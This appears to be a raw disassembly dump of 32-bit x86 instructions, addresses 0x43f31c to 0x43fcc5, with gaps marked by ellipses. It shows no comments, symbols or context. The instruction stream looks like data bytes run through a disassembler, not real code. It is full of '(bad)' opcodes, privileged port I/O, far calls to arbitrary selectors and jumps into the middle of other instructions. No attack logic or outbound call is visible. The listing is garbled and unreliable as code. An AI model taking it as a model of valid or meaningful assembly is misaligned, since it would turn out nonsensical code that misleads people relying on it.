  43f31c:	inc    BYTE PTR [ebx]
  43f31e:	or     eax,0xdd08317
  43f323:	inc    edx
  43f324:	inc    eax
  43f325:	ins    DWORD PTR es:[edi],dx
  43f326:	add    ecx,DWORD PTR [esi]
  43f328:	add    dh,BYTE PTR [edi]
  43f32a:	fld    QWORD PTR [esi+esi*8]
  43f32d:	mov    BYTE PTR [eax-0x7d],cl
  43f330:	jne    0x43f3a6
  43f332:	mov    ebp,0x8908b1
	...
  43f353:	add    BYTE PTR [eax-0x4d],bl
  43f356:	jne    0x43f3a4
  43f358:	popf   
  43f359:	mov    eax,ds:0x5b96df89
  43f35e:	push   ds
  43f35f:	xchg   BYTE PTR [esi-0x79146d0f],bl
  43f365:	shr    ebx,1
  43f367:	jl     0x43f3e6
  43f369:	add    DWORD PTR [esi],edi
  43f36b:	push   ss
  43f36c:	dec    edx
  43f36d:	fwait
  43f36e:	ds ins DWORD PTR es:[edi],dx
  43f370:	sbb    al,0x0
  43f372:	call   0xd07:0xe4068dfb
  43f379:	add    BYTE PTR [ebx-0x1b0465f8],bl
  43f37f:	add    ecx,DWORD PTR ds:0x34dce619
  43f385:	js     0x43f32a
  43f387:	call   DWORD PTR [ebx+0x429de0b2]
  43f38d:	lods   eax,DWORD PTR ds:[esi]
  43f38e:	xchg   edx,eax
  43f38f:	mov    bl,0xdd
  43f391:	pop    ss
  43f392:	sbb    al,0xd0
  43f394:	xor    al,BYTE PTR [eiz*2-0x578501b8]
  43f39b:	cdq    
  43f39c:	popf   
  43f39d:	js     0x43f3d2
  43f39f:	adc    BYTE PTR [ebx-0x3f4d0b46],dl
  43f3a5:	scas   eax,DWORD PTR es:[edi]
  43f3a6:	ins    DWORD PTR es:[edi],dx
  43f3a7:	leave  
  43f3a8:	adc    dh,BYTE PTR [edi+0x20]
  43f3ab:	lock mov esi,DWORD PTR [eax+0x2ef7b4e4]
  43f3b2:	gs dec eax
  43f3b4:	add    al,bh
  43f3b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f3b7:	cdq    
	...
  43f3d4:	add    BYTE PTR [eax],al
  43f3d6:	inc    ecx
  43f3d7:	jne    0x43f3fe
  43f3d9:	adc    DWORD PTR [ecx-0x6c27f5c0],ecx
  43f3df:	mov    ch,0x84
  43f3e1:	mov    esp,0xb3f0c452
  43f3e6:	inc    ecx
  43f3e7:	in     eax,dx
  43f3e8:	push   0x1e010a90
  43f3ed:	cdq    
  43f3ee:	add    al,0x80
  43f3f0:	in     al,0xfb
  43f3f2:	mov    al,0xfd
  43f3f4:	rol    DWORD PTR [esi],cl
  43f3f6:	lea    eax,[eax+eiz*8-0x1d73f1fe]
  43f3fd:	mov    BYTE PTR [edx-0x7d],bl
  43f400:	and    ebx,DWORD PTR [ebx]
  43f402:	pop    es
  43f403:	imul   esp,ebp,0xff2b1b45
  43f409:	pop    edi
  43f40a:	push   esp
  43f40b:	pop    ds
  43f40c:	push   es
  43f40d:	sub    edi,eax
  43f40f:	stos   DWORD PTR es:[edi],eax
  43f410:	out    0x9c,eax
  43f412:	fs jp  0x43f459
  43f415:	and    DWORD PTR [eax-0x44],ebx
  43f418:	out    dx,eax
  43f419:	out    0x8c,al
  43f41b:	(bad)  
  43f41d:	push   cs
  43f41e:	or     cl,BYTE PTR [esi+0xf4c720b]
  43f424:	cmp    BYTE PTR [edx+ebp*1+0x13d57df6],ch
  43f42b:	push   es
  43f42c:	cli    
  43f42d:	bound  ebx,QWORD PTR [edi+esi*8-0x4ae2c37a]
  43f434:	gs jmp 0xa563e055
	...
  43f456:	add    BYTE PTR [eax],al
  43f458:	dec    edi
  43f459:	add    eax,DWORD PTR [ebp+0x4c79e524]
  43f45f:	rcl    DWORD PTR [edi+0x6a57e32],1
  43f465:	cli    
  43f466:	shl    dh,1
  43f468:	mov    dh,BYTE PTR [ebx-0x7]
  43f46b:	scas   al,BYTE PTR es:[edi]
  43f46c:	or     edi,DWORD PTR [edx+0x74]
  43f46f:	icebp  
  43f470:	xchg   esp,eax
  43f471:	add    cl,BYTE PTR [edi+0x39]
  43f474:	mov    ds:0xd765e7b0,al
  43f479:	add    bh,dl
  43f47b:	push   0x52
  43f47d:	out    dx,eax
  43f47e:	test   BYTE PTR [ecx+0x7f737bd3],ch
  43f484:	sbb    eax,DWORD PTR [esi]
  43f486:	mov    WORD PTR [ebx*1+0x37a686b3],gs
  43f48d:	cmp    edi,esp
  43f48f:	sub    eax,0x6afa0604
  43f494:	push   edx
  43f495:	inc    DWORD PTR [ecx+ebp*1+0x4f5b7ba3]
  43f49c:	or     eax,DWORD PTR [esi]
  43f49e:	mov    WORD PTR [eax],es
  43f4a0:	pop    ecx
  43f4a1:	repnz dec edi
  43f4a3:	mov    esi,DWORD PTR [ebx]
  43f4a5:	xchg   al,cl
  43f4a7:	call   0x39ed34
  43f4ac:	out    0xba,eax
  43f4ae:	inc    BYTE PTR [esp+0xa448302]
  43f4b5:	repnz cmc 
  43f4b7:	cmp    DWORD PTR [ecx+0x8505f2],esi
	...
  43f4d9:	add    BYTE PTR [edi],bh
  43f4db:	hlt    
  43f4dc:	cmc    
  43f4dd:	(bad)  
  43f4de:	fld    DWORD PTR [edi-0x2a]
  43f4e1:	push   edx
  43f4e2:	mov    edi,0xcce81b9
  43f4e7:	push   ss
  43f4e8:	icebp  
  43f4e9:	jmp    FWORD PTR [ebx]
  43f4eb:	cmp    BYTE PTR [esi+0x5bba104],0x85
  43f4f2:	pop    ss
  43f4f3:	repnz cmc 
  43f4f5:	jmp    FWORD PTR [ecx-0x50af09c6]
  43f4fb:	mov    esp,0x703cce81
  43f500:	hlt    
  43f501:	dec    ebx
  43f503:	jg     0x43f4c3
  43f505:	add    al,0x71
  43f507:	mov    esp,0xf3ef8505
  43f50c:	cmc    
  43f50d:	jmp    DWORD PTR [edi+0x71]
  43f510:	test   BYTE PTR [ecx],0xfb
  43f513:	jp     0x43f514
  43f515:	std    
  43f516:	jnp    0x43f50b
  43f518:	sbb    DWORD PTR [ebp-0x7c],0xf4dc4b87
  43f51f:	dec    esi
  43f520:	dec    edi
  43f521:	push   edi
  43f522:	and    ah,ah
  43f524:	clc    
  43f525:	cmp    dh,BYTE PTR [ebp+edi*8+0x7ae0c47a]
  43f52c:	mov    edx,0xfbda210f
  43f531:	dec    DWORD PTR [ebx-0x7f]
  43f534:	push   ebx
  43f535:	cld    
  43f536:	or     eax,0x86c27745
  43f53b:	loope  0x43f558
  43f53d:	xor    DWORD PTR [eax],eax
	...
  43f55b:	add    BYTE PTR [edi+0x517e0cba],dl
  43f561:	sbb    eax,DWORD PTR [ecx+0x399412bf]
  43f567:	cld    
  43f568:	jp     0x43f53c
  43f56a:	jle    0x43f5e8
  43f56c:	jno    0x43f5b5
  43f56e:	mov    bh,0x1
  43f570:	adc    edx,DWORD PTR [edx]
  43f572:	add    eax,0x860cea60
  43f578:	rcl    dl,1
  43f57a:	lods   al,BYTE PTR ds:[esi]
  43f57b:	pop    ecx
  43f57c:	xchg   dh,ah
  43f57e:	test   al,0x86
  43f580:	xor    BYTE PTR [edi+edi*1-0x35],ah
  43f584:	push   ecx
  43f585:	fs ja  0x43f573
  43f588:	xchg   BYTE PTR [esi+esi*8+0x4e],ah
  43f58c:	fisttp DWORD PTR [ebp-0x723df46f]
  43f592:	inc    esp
  43f593:	xchg   BYTE PTR [edx+ebx*1],ah
  43f596:	pop    edx
  43f597:	ret    0x9dfd
  43f59a:	sub    eax,eax
  43f59c:	and    eax,0x157c7527
  43f5a1:	xchg   esi,eax
  43f5a2:	pop    ds
  43f5a3:	sbb    dl,BYTE PTR [esp+ebp*8+0x21d586ff]
  43f5aa:	pop    edx
  43f5ab:	fimul  DWORD PTR [eax]
  43f5ad:	xchg   esi,eax
  43f5ae:	and    ecx,DWORD PTR [edx]
  43f5b0:	pop    edx
  43f5b1:	nop
  43f5b2:	mov    BYTE PTR [edi],cl
  43f5b4:	xchg   esi,eax
  43f5b5:	jmp    0x43f5b2
  43f5b7:	or     ch,BYTE PTR [ecx-0x15810aa7]
  43f5bd:	stc    
  43f5be:	jle    0x43f582
	...
  43f5dc:	add    BYTE PTR [eax],al
  43f5de:	mov    DWORD PTR [ecx],ebx
  43f5e0:	(bad)  
  43f5e1:	dec    esp
  43f5e3:	jle    0x43f5da
  43f5e5:	mov    BYTE PTR [edi],dh
  43f5e7:	sub    esi,DWORD PTR [edi-0x40]
  43f5ea:	xchg   bh,bh
  43f5ec:	(bad)  
  43f5ed:	cld    
  43f5ee:	jbe    0x43f5f7
  43f5f0:	in     eax,dx
  43f5f1:	add    dl,0xe0
  43f5f4:	pop    edi
  43f5f5:	rcl    DWORD PTR [edx],0x75
  43f5f8:	daa    
  43f5f9:	cld    
  43f5fa:	por    xmm0,XMMWORD PTR [edx+0x77]
  43f5ff:	hlt    
  43f600:	cdq    
  43f601:	inc    edx
  43f602:	imul   edi,edx,0x27
  43f605:	sbb    eax,0xcc487d11
  43f60a:	repz push ds
  43f60c:	add    DWORD PTR [ecx],eax
  43f60e:	push   esp
  43f60f:	mov    eax,ds:0x770ec16f
  43f614:	fisubr WORD PTR [eax+0x3f1c3cb9]
  43f61a:	inc    esi
  43f61b:	xor    esi,DWORD PTR [edi+edi*1]
  43f61e:	push   esi
  43f61f:	xor    ebp,DWORD PTR [edi+edi*1]
  43f622:	push   esi
  43f623:	xor    ebx,DWORD PTR [ebx-0x383d988]
  43f629:	xchg   esi,eax
  43f62a:	ret    
  43f62b:	test   eax,0xcc3a7f39
  43f630:	(bad)  
  43f632:	cmp    eax,esp
  43f634:	fst    DWORD PTR [ecx+0x6e217310]
  43f63a:	mov    bh,0xa1
  43f63c:	sbb    eax,0xa65df17f
  43f641:	jg     0x43f643
	...
  43f65f:	add    BYTE PTR [eax+ebx*2-0x1a],cl
  43f663:	rcl    DWORD PTR [edx-0x75],0x19
  43f667:	test   al,0x3
  43f669:	dec    esi
  43f66a:	xor    edi,DWORD PTR [edi+0x3c]
  43f66d:	xor    BYTE PTR [edx],dh
  43f66f:	mov    ch,0x52
  43f671:	push   edx
  43f672:	cmp    DWORD PTR [eax+edx*1],ebx
  43f675:	cmp    ah,bh
  43f677:	add    edx,DWORD PTR [edx-0x3c]
  43f67a:	fild   DWORD PTR [eax-0x791b8b76]
  43f680:	retf   
  43f681:	inc    DWORD PTR [eax]
  43f683:	sbb    cl,0x8c
  43f686:	inc    ebx
  43f687:	jne    0x43f702
  43f689:	xchg   BYTE PTR [edx+0x19],al
  43f68c:	sub    cl,cl
  43f68e:	call   0xfa3e083c
  43f693:	push   0x4d
  43f695:	add    eax,DWORD PTR [ebx+0x7d047d29]
  43f69b:	xor    dl,BYTE PTR [esi]
  43f69d:	out    0xa,al
  43f69f:	push   0xa250f394
  43f6a4:	adc    esi,edi
  43f6a6:	ins    DWORD PTR es:[edi],dx
  43f6a7:	in     al,0xc3
  43f6a9:	xchg   edi,eax
  43f6aa:	stc    
  43f6ab:	es push ss
  43f6ad:	xchg   BYTE PTR [edx-0x27],al
  43f6b0:	in     eax,0x4b
  43f6b2:	mov    WORD PTR [eax+0x51e8c8db],?
  43f6b8:	add    edx,edi
  43f6ba:	stc    
  43f6bb:	push   0xffffffcd
  43f6bd:	add    al,BYTE PTR [ebx+0x7efe9d29]
  43f6c3:	and    al,BYTE PTR [eax]
	...
  43f6e1:	add    BYTE PTR [esi],al
  43f6e3:	xchg   BYTE PTR [edx-0x47],al
  43f6e6:	mov    ch,0x53
  43f6e8:	nop
  43f6e9:	cmp    ebp,DWORD PTR [edx+0x1689e8c8]
  43f6ef:	cli    
  43f6f0:	stc    
  43f6f1:	push   0xffffffda
  43f6f3:	add    al,BYTE PTR [ebx+0x7efe82a9]
  43f6f9:	mov    dl,0x17
  43f6fb:	mov    WORD PTR [ebx+0x55],es
  43f6fe:	mov    esi,0x7bf94285
  43f703:	leave  
  43f704:	call   0xfa3dfd6a
  43f709:	push   0x2a
  43f70b:	add    eax,DWORD PTR [ebx+0x7efd92a9]
  43f711:	mov    ds:0xd9428607,al
  43f716:	push   ebp
  43f717:	dec    esp
  43f718:	cwde   
  43f719:	add    BYTE PTR ds:0xc4e8c77f,ah
  43f71f:	or     dh,dh
  43f721:	jmp    DWORD PTR [edi]
  43f723:	aas    
  43f724:	std    
  43f725:	test   BYTE PTR [esi+ecx*4-0x6],ah
  43f729:	sbb    bh,0x9
  43f72c:	add    BYTE PTR [esi+0x4],0x79
  43f730:	push   esp
  43f731:	pushf  
  43f732:	push   esi
  43f733:	jge    0x43f6fc
  43f735:	call   0x3a01b6
  43f73a:	idiv   DWORD PTR [esi]
  43f73c:	std    
  43f73d:	test   BYTE PTR [edi+ecx*4],dh
  43f740:	cli    
  43f741:	sub    BYTE PTR [edi],0xa
  43f744:	add    BYTE PTR [ebp+0x0],0x0
	...
  43f764:	shl    BYTE PTR [ecx+0x36a98d49],0xe1
  43f76b:	xchg   ecx,eax
  43f76c:	add    cl,BYTE PTR [edx]
  43f76e:	test   BYTE PTR [ebx+0x4d8cd2aa],0xc4
  43f775:	mov    bl,0x82
  43f777:	into   
  43f778:	sbb    al,0x76
  43f77a:	icebp  
  43f77b:	inc    DWORD PTR [ebx-0x7c]
  43f77e:	mov    ebp,0x6d42a90c
  43f783:	add    esp,DWORD PTR [edi-0x57409c3]
  43f789:	ror    DWORD PTR [ebp+edx*2-0x317d4ac0],cl
  43f790:	dec    esp
  43f791:	mov    ecx,?
  43f793:	inc    DWORD PTR [ebx-0x7c]
  43f796:	mov    ebp,0x6d447904
  43f79b:	add    esi,DWORD PTR [edi+0x3b]
  43f79e:	test   BYTE PTR [ebx+0x4d8c0829],0xa0
  43f7a5:	jns    0x43f7eb
  43f7a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f7a8:	pop    edi
  43f7a9:	ret    0x5129
  43f7ac:	pop    edi
  43f7ad:	cmp    cl,BYTE PTR [eax+0x1c3f0d7d]
  43f7b3:	push   ebp
  43f7b4:	aad    0x8e
  43f7b6:	pop    es
  43f7b7:	jle    0x43f78a
  43f7b9:	jmp    0x43f835
  43f7bb:	mov    edi,0xc684ea39
  43f7c0:	mov    edx,0x80fba962
  43f7c5:	and    al,0x50
  43f7c7:	dec    edi
	...
  43f7e4:	add    BYTE PTR [eax],al
  43f7e6:	xchg   esi,eax
  43f7e7:	lods   eax,DWORD PTR ds:[esi]
  43f7e8:	int    0x86
  43f7ea:	shl    DWORD PTR [eax-0x57],cl
  43f7ed:	stos   DWORD PTR es:[edi],eax
  43f7ee:	test   ah,dl
  43f7f0:	dec    ebp
  43f7f1:	out    0xb4,eax
  43f7f3:	push   esi
  43f7f4:	pop    es
  43f7f5:	cli    
  43f7f6:	mov    gs,WORD PTR [ebx]
  43f7f8:	add    BYTE PTR [ebp+0x7f04b34d],al
  43f7fe:	inc    esi
  43f7ff:	ss jnp 0x43f843
  43f802:	cmp    eax,0xbcb7b15c
  43f807:	jno    0x43f83f
  43f809:	out    0x4c,eax
  43f80b:	push   ss
  43f80c:	pop    es
  43f80d:	cli    
  43f80e:	mov    gs,WORD PTR [ebx]
  43f810:	add    BYTE PTR [ebp+0x7f04934d],al
  43f816:	push   esi
  43f817:	push   es
  43f818:	jnp    0x43f85b
  43f81a:	std    
  43f81b:	imul   ebp,DWORD PTR [ecx+0x3661dfbb],0xffffffe7
  43f822:	test   BYTE PTR fs:[eax],0xfa
  43f826:	mov    gs,WORD PTR [ebx+0x534d84f9]
  43f82c:	add    edi,DWORD PTR [edi+0x46]
  43f82f:	(bad)  
  43f830:	jb     0x43f876
  43f832:	dec    ebp
  43f833:	aaa    
  43f834:	jnp    0x43f877
  43f836:	cmp    eax,0x9ce73772
  43f83b:	mov    ch,0x8
  43f83d:	cli    
  43f83e:	mov    gs,WORD PTR [edx+0x32cd84f9]
  43f844:	add    edi,DWORD PTR [edi-0x2a]
  43f847:	jmp    DWORD PTR [ecx+0x7c]
	...
  43f865:	add    BYTE PTR [eax],al
  43f867:	add    BYTE PTR [eax+esi*1+0x6c],cl
  43f86b:	mov    dh,0xce
  43f86d:	dec    esi
  43f86e:	pop    esi
  43f86f:	cmp    edx,ebp
  43f871:	jbe    0x43f805
  43f873:	or     bh,al
  43f875:	sub    BYTE PTR [ebx-0xc407601],0x4
  43f87c:	cmp    cl,cl
  43f87e:	jb     0x43f8fc
  43f880:	dec    esp
  43f881:	xor    BYTE PTR [esi+ebp*4-0x2e],bl
  43f885:	push   ecx
  43f886:	outs   dx,BYTE PTR ds:[esi]
  43f887:	cmp    DWORD PTR [edx-0x68f7ad42],ebp
  43f88d:	sub    BYTE PTR [ebx],0xff
  43f890:	mov    DWORD PTR [edi-0x36f5fb2d],edi
  43f896:	inc    edx
  43f897:	jbe    0x43f862
  43f899:	sti    
  43f89a:	xchg   edi,eax
  43f89b:	jl     0x43f869
  43f89d:	das    
  43f89e:	pop    esi
  43f89f:	cmp    DWORD PTR [edx-0x5a],ebp
  43f8a2:	xor    cl,BYTE PTR [eax]
  43f8a4:	sub    BYTE PTR [bp+di],0xff
  43f8a8:	mov    DWORD PTR [edi-0x3725fb6d],edi
  43f8ae:	adc    bh,BYTE PTR [ecx+eax*8-0x5]
  43f8b2:	pusha  
  43f8b3:	xchg   BYTE PTR [edx],dh
  43f8b5:	mov    BYTE PTR [edi+ecx*2+0x7a034a95],al
  43f8bc:	mov    ecx,0x72c6cfb
  43f8c1:	sub    DWORD PTR [ebx+eax*1],0xd
  43f8c5:	add    BYTE PTR [esi-0x3f],ch
  43f8c8:	adc    al,BYTE PTR [ebx+0x90a7]
	...
  43f8ea:	int    0x88
  43f8ec:	and    al,0xf0
  43f8ee:	fcomi  st,st(6)
  43f8f0:	push   esi
  43f8f1:	cld    
  43f8f2:	xchg   edx,eax
  43f8f3:	sbb    al,0xea
  43f8f5:	jl     0x43f878
  43f8f7:	cld    
  43f8f8:	into   
  43f8f9:	add    eax,DWORD PTR [ebp+ecx*2-0x9734b00]
  43f900:	je     0x43f90a
  43f902:	mov    eax,cs
  43f904:	je     0x43f90a
  43f906:	push   sp
  43f908:	cld    
  43f909:	jb     0x43f8ae
  43f90b:	sub    ecx,DWORD PTR [esi+0x62]
  43f90e:	mov    ds:0x8b625017,eax
  43f913:	dec    DWORD PTR [esi+0x1b]
  43f916:	or     cl,bl
  43f918:	jge    0x43f8bf
  43f91a:	shl    DWORD PTR [edx],0x43
  43f91d:	jne    0x43f8bc
  43f91f:	cli    
  43f920:	jle    0x43f8c4
  43f922:	adc    ah,BYTE PTR [edx]
  43f924:	jnp    0x43f98b
  43f926:	and    BYTE PTR [esp+edi*8+0x64],bh
  43f92a:	out    0x73,al
  43f92c:	jae    0x43f998
  43f92e:	test   BYTE PTR [ebx],dl
  43f930:	add    ch,dl
  43f932:	mov    ds:0x6814382,eax
  43f937:	jl     0x43f955
  43f939:	add    bh,BYTE PTR [edx]
  43f93b:	push   0xfffffffe
  43f93d:	popa   
  43f93e:	add    DWORD PTR [edx+0x7b],edi
  43f941:	sub    eax,0x721f7411
  43f946:	dec    esp
  43f947:	test   DWORD PTR [ebp-0x9ac151],0x6f
	...
  43f969:	add    BYTE PTR [eax],al
  43f96b:	add    BYTE PTR [edi+0x26b74f4b],bl
  43f971:	shl    DWORD PTR [ecx],0xe9
  43f974:	push   cs
  43f975:	jnp    0x43f93b
  43f977:	aad    0x8d
  43f979:	mov    ebx,0x43b1ec73
  43f97e:	cld    
  43f97f:	add    cl,BYTE PTR [esi]
  43f981:	jnp    0x43f948
  43f983:	out    0x8f,al
  43f985:	jl     0x43f93f
  43f987:	jmp    0x54c11f14
  43f98c:	and    eax,0x860573fb
  43f991:	push   esp
  43f992:	sbb    BYTE PTR [eax],al
  43f994:	jg     0x43f953
  43f996:	sub    DWORD PTR [ebx+0x524ee82a],ecx
  43f99c:	outs   dx,DWORD PTR ds:[esi]
  43f99d:	lods   eax,DWORD PTR ds:[esi]
  43f99e:	std    
  43f99f:	dec    edi
  43f9a0:	add    eax,0xb083cb03
  43f9a5:	out    dx,al
  43f9a6:	sub    cl,cl
  43f9a8:	out    dx,eax
  43f9a9:	cmp    DWORD PTR [esi+eax*1-0x49],esi
  43f9ad:	ds xor cl,al
  43f9b0:	and    bh,bh
  43f9b2:	js     0x43f97f
  43f9b4:	mov    esi,DWORD PTR [ebp+0x44]
  43f9b7:	mov    eax,0xcf22373f
  43f9bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f9bd:	mov    bh,0xf5
  43f9bf:	jmp    0x43f96d
  43f9c1:	jne    0x43fa17
  43f9c3:	mov    eax,0x8bf5afb5
  43f9c8:	out    0x7f,al
  43f9ca:	ror    BYTE PTR [edi],cl
  43f9cc:	and    DWORD PTR [eax+eax*1],edi
	...
  43f9eb:	add    BYTE PTR [eax],al
  43f9ed:	add    BYTE PTR [edi+edi*2-0x47],dh
  43f9f1:	(bad)  
  43f9f3:	fild   WORD PTR [eax]
  43f9f5:	add    BYTE PTR [ebx+ebx*8+0x44],ah
  43f9f9:	cld    
  43f9fa:	in     eax,dx
  43f9fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f9fc:	in     eax,dx
  43f9fd:	je     0x43fa10
  43f9ff:	ja     0x43fa45
  43fa01:	cld    
  43fa02:	lea    ebx,[eax+0x75945200]
  43fa08:	aas    
  43fa09:	xor    BYTE PTR [esp+ebp*4-0x19cb61f],dl
  43fa10:	inc    DWORD PTR [edx-0x30851510]
  43fa16:	cmp    edi,DWORD PTR [edx-0x47]
  43fa19:	jne    0x43fa3c
  43fa1b:	jnp    0x43fa61
  43fa1d:	cld    
  43fa1e:	psubd  mm0,QWORD PTR [edx+0x79003fdf]
  43fa25:	iret   
  43fa26:	cmp    eax,DWORD PTR [eax-0x16f24784]
  43fa2c:	hlt    
  43fa2d:	sub    esi,0x96fffde7
  43fa33:	sub    esp,edx
  43fa35:	mov    WORD PTR [eax-0x49],cs
  43fa38:	lods   eax,DWORD PTR ds:[esi]
  43fa39:	xchg   bl,al
  43fa3b:	mov    edi,0xaaeaf1f7
  43fa40:	jg     0x43fa05
  43fa42:	or     DWORD PTR [esp+eax*2+0x73],ebp
  43fa46:	movd   mm4,DWORD PTR [ebx]
  43fa49:	xchg   BYTE PTR [ebx-0x29],cl
  43fa4c:	jb     0x43faa2
  43fa4e:	lds    esi,FWORD PTR ds:0xc977
	...
  43fa70:	mov    ch,0x7b
  43fa72:	or     edx,edi
  43fa74:	mov    edx,0x88034066
  43fa79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fa7a:	nop
  43fa7b:	std    
  43fa7c:	xchg   edi,eax
  43fa7d:	mov    bh,BYTE PTR [edi+0x7c]
  43fa80:	popf   
  43fa81:	call   0xdc187410
  43fa86:	push   ecx
  43fa87:	je     0x43fa79
  43fa89:	sub    DWORD PTR gs:[edi-0x73132bf3],0x86b492c8
  43fa94:	shl    esi,cl
  43fa96:	js     0x43fa61
  43fa98:	gs jae 0x43faa5
  43fa9b:	cli    
  43fa9c:	push   0x66
  43fa9e:	inc    eax
  43fa9f:	add    ecx,DWORD PTR [eax-0x78026fd9]
  43faa5:	cmp    al,ch
  43faa7:	jl     0x43fa52
  43faa9:	pushf  
  43faaa:	loop   0x43fb2a
  43faac:	enter  0x43e,0x75
  43fab0:	sbb    ch,BYTE PTR [esi-0x46]
  43fab3:	das    
  43fab4:	mov    BYTE PTR [ecx+ebx*2+0x1c218650],ch
  43fabb:	xchg   ebp,eax
  43fabc:	and    ebp,edx
  43fabe:	add    al,0x7e
  43fac0:	dec    ecx
  43fac1:	add    bl,ch
  43fac3:	jle    0x43fb1f
  43fac5:	je     0x43faac
  43fac7:	js     0x43fb00
  43fac9:	aaa    
  43faca:	push   esp
  43facb:	and    BYTE PTR [ecx-0x157999e5],al
  43fad1:	(bad)  
  43fad2:	cmp    ebp,ebp
	...
  43faf0:	add    BYTE PTR [eax],al
  43faf2:	xchg   ebx,eax
  43faf3:	inc    ecx
  43faf4:	div    DWORD PTR [esi+0x59]
  43faf7:	in     al,0x15
  43faf9:	jns    0x43facf
  43fafb:	out    0x2f,eax
  43fafd:	push   cs
  43fafe:	out    0xf8,eax
  43fb00:	data16 aas 
  43fb02:	push   cs
  43fb03:	and    DWORD PTR [edi-0x4d7a2f71],0xffffffca
  43fb0a:	dec    ecx
  43fb0b:	rcl    BYTE PTR [esi+edx*8],0x91
  43fb0f:	inc    edx
  43fb10:	xchg   ebx,eax
  43fb11:	mov    bl,0x93
  43fb13:	inc    ecx
  43fb14:	mov    bh,0x78
  43fb16:	(bad)  
  43fb17:	out    0xa3,eax
  43fb19:	push   cs
  43fb1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fb1b:	clc    
  43fb1c:	data16 aas 
  43fb1e:	push   cs
  43fb1f:	in     eax,0xfc
  43fb21:	js     0x43fb6c
  43fb23:	clc    
  43fb24:	outs   dx,BYTE PTR ds:[esi]
  43fb25:	lods   eax,DWORD PTR ds:[esi]
  43fb26:	loop   0x43fb8d
  43fb28:	call   0xb59385c6
  43fb2d:	lods   eax,DWORD PTR ds:[esi]
  43fb2e:	push   0x62
  43fb30:	stc    
  43fb31:	add    ecx,DWORD PTR ds:0x89ef237d
  43fb37:	mov    edi,0xd89201bb
  43fb3c:	pop    esi
  43fb3d:	mov    esi,0xbb4845e
  43fb42:	mov    DWORD PTR [ebx-0x11],eax
  43fb45:	inc    DWORD PTR [ebp-0x2e37e4be]
  43fb4b:	mov    bh,0xda
  43fb4d:	and    DWORD PTR [ecx],0x910402f9
  43fb53:	aam    0xea
  43fb55:	jle    0x43fb57
	...
  43fb73:	add    BYTE PTR [esi+0xee8ffff],dl
  43fb79:	jns    0x43fbf6
  43fb7b:	leave  
  43fb7c:	push   cs
  43fb7d:	je     0x43fbee
  43fb7f:	jb     0x43fb0d
  43fb81:	mov    ebx,0x32e52485
  43fb86:	clc    
  43fb87:	pop    edx
  43fb88:	sbb    eax,0xd709537d
  43fb8d:	cld    
  43fb8e:	adc    cl,ch
  43fb90:	mov    DWORD PTR [ebx-0xc],edi
  43fb93:	ror    BYTE PTR [edx],cl
  43fb95:	jg     0x43fbda
  43fb97:	mov    ebp,0xe9fc7b92
  43fb9c:	pop    edx
  43fb9d:	adc    al,0x85
  43fb9f:	sub    al,0xd
  43fba1:	cwde   
  43fba2:	callw  0x4bde
  43fba6:	test   DWORD PTR [edi],ebp
  43fba8:	add    DWORD PTR [eax+0x52],edx
  43fbab:	adc    DWORD PTR [esi],0x93e90032
  43fbb1:	mov    esp,0x6cc96414
  43fbb6:	std    
  43fbb7:	imul   ebx,edx,0x256e83f9
  43fbbd:	sub    bh,BYTE PTR [ebp-0x1c]
  43fbc0:	repnz push DWORD PTR [ecx+0x11]
  43fbc4:	cmp    BYTE PTR [ebx-0xc],0x62
  43fbc8:	fcomp  QWORD PTR [edi]
  43fbca:	test   DWORD PTR [edi-0x1abd82c2],esi
  43fbd0:	xlat   BYTE PTR ds:[ebx]
  43fbd1:	inc    esi
  43fbd2:	test   DWORD PTR [edi+0x3650460a],ebp
	...
  43fbf4:	add    BYTE PTR [eax],al
  43fbf6:	inc    eax
  43fbf7:	jne    0x43fbbd
  43fbf9:	fldenv [ebx]
  43fbfb:	shl    DWORD PTR [ebp+esi*8-0x11],0x74
  43fc00:	lds    ebx,FWORD PTR [esi]
  43fc02:	out    dx,eax
  43fc03:	jl     0x43fbc2
  43fc05:	mov    dl,0x9b
  43fc07:	jecxz  0x43fc64
  43fc09:	sub    dl,BYTE PTR [ebp+ecx*8+0x7e490073]
  43fc10:	jne    0x43fc1a
  43fc12:	and    al,0x6f
  43fc14:	add    eax,0xb10aa18b
  43fc19:	push   ss
  43fc1a:	xor    al,0x3
  43fc1c:	add    BYTE PTR [ebp-0x5a147047],cl
  43fc22:	lahf   
  43fc23:	inc    edi
  43fc24:	or     al,0x85
  43fc26:	mov    ah,0x6e
  43fc28:	add    ecx,DWORD PTR [ebx+0x4d83e839]
  43fc2e:	fadd   QWORD PTR [ebx+0x83c8910]
  43fc34:	push   edi
  43fc35:	pop    esi
  43fc36:	outs   dx,DWORD PTR ds:[esi]
  43fc37:	mov    esi,0x5fc98b53
  43fc3c:	mov    ebx,0xccc6a0cc
  43fc41:	int3   
  43fc42:	mov    al,ds:0x9ccccc6
  43fc47:	xchg   esp,ebp
  43fc49:	mov    ebp,ecx
  43fc4b:	daa    
  43fc4c:	or     DWORD PTR [ebp-0x3c],0xffffff85
  43fc50:	dec    ebp
  43fc51:	sbb    al,0x14
  43fc53:	xchg   DWORD PTR ds:0x45870518,edi
  43fc59:	adc    al,0x0
	...
  43fc77:	add    BYTE PTR [esi],al
  43fc79:	xchg   DWORD PTR [ebp+0x10],ecx
  43fc7c:	push   esp
  43fc7d:	test   DWORD PTR ds:0x624c550c,edi
  43fc83:	add    ah,al
  43fc85:	test   DWORD PTR ds:0xf329cc08,edi
  43fc8b:	call   ebx
  43fc8d:	jge    0x43fc53
  43fc8f:	and    BYTE PTR [ecx-0x76ffdf44],dl
  43fc95:	test   esp,ebp
  43fc97:	push   esi
  43fc98:	out    dx,eax
  43fc99:	ja     0x43fca3
  43fc9b:	test   edx,edi
  43fc9d:	ja     0x43fca7
  43fc9f:	lea    ebp,[edx+0xd5d5694]
  43fca5:	sub    eax,DWORD PTR [ecx]
  43fca7:	add    BYTE PTR [esi-0x347a8a62],dl
  43fcad:	jl     0x43fd1a
  43fcaf:	add    BYTE PTR [edi-0x48ff9418],ah
  43fcb5:	call   0x9ed7fd25
  43fcba:	push   ebp
  43fcbb:	or     ax,0x966c
  43fcbf:	fmul   DWORD PTR ds:0x984dfde9
  43fcc5:	test   BYTE PTR gs:[eax],al
